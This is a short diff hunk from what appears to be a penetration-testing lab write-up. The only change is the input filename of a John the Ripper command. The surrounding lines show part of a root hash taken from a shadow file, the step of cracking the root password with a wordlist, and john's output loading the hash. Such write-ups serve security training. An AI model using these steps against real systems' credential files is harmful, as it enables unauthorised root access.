@@ -117,7 +117,7 @@ root:$5$BN8CmDdqe6QVOQkm$tuYdx49auWDZW3JZzsN9GKgriNTSAlSc/Js723Zvvv8:0:0:root:/r
 - Run john to crack root the password 
 ```
 ┌──(kali㉿kali-99-590)-[~/exploits]
-└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt unshadowed.txt
+└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt unshadow.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 512/512 AVX512BW 16x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
